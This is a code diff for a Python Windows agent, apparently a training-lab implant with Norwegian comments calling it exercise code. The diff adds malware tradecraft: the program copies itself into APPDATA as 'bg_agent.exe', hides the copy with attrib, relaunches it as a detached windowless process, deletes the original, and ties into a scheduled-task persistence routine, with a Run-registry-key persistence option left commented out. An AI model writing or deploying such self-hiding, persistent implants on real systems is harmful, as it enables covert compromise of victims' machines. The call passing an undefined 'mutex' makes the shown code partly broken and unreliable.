@@ -239,31 +239,47 @@ def labActionLoop(init_message):
 # --------- SÅRBARHET / ØVELSESKODE SLUTTER HER ----------------
 
 # # -------------- ØVELSES PERSISTENSE REGKEY -----------------
-# import winreg
+import ctypes
+import os
+import shutil
+import subprocess
+import sys
+import time
 
+def copySelfToKnowPath(mutex=None):
+    if len(sys.argv) > 1:
+        file_to_delete = sys.argv[1]
+        if os.path.exists(file_to_delete):
+            for _ in range(10):
+                try:
+                    os.remove(file_to_delete)
+                    break
+                except PermissionError:
+                    time.sleep(0.2)
 
-def copySelfToKnowPath():
-    import os
-    import sys
     known_path = os.path.join(os.getenv("APPDATA"), "bg_agent.exe")
+
     if not os.path.exists(known_path):
-        import shutil
         shutil.copy2(sys.executable, known_path)
 
+        try:
+            os.system(f'attrib +h "{known_path}"')
+        except Exception:
+            pass
 
-    #delete original
-    try:
-        os.remove(sys.executable)
-    except Exception as e:
-        pass
+        try:
+            if mutex:
+                ctypes.windll.kernel32.ReleaseMutex(mutex)
 
-    # hidde self
-    try:
-        os.system(f'attrib +h "{known_path}"')
-    except Exception as e:
-        pass
+            # Send sys.executable som argument til den nye prosessen
+            flags = subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
+            subprocess.Popen([known_path, sys.executable], creationflags=flags, close_fds=True)
+            sys.exit(0)
+        except Exception:
+            pass
 
     return known_path
+
 
 # PERSISTENCE_REGKEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
 # PERSISTENCE_VALUE_NAME = "bg_agent"
@@ -330,7 +346,7 @@ def createScheduledTask(task_name = "bg_agent_task"):
 
 if __name__ == "__main__": 
     init_message = ""
-    init_message += createScheduledTask() + "\n"
+    init_message += createScheduledTask(mutex) + "\n"
     # try:
     #     retvalue = setPersistenceIfNotSet(PERSISTENCE_REGKEY, PERSISTENCE_VALUE_NAME, PERSISTENCE_VALUE_DATA)
     #     init_message += f"RUN regkey persistence success\n"
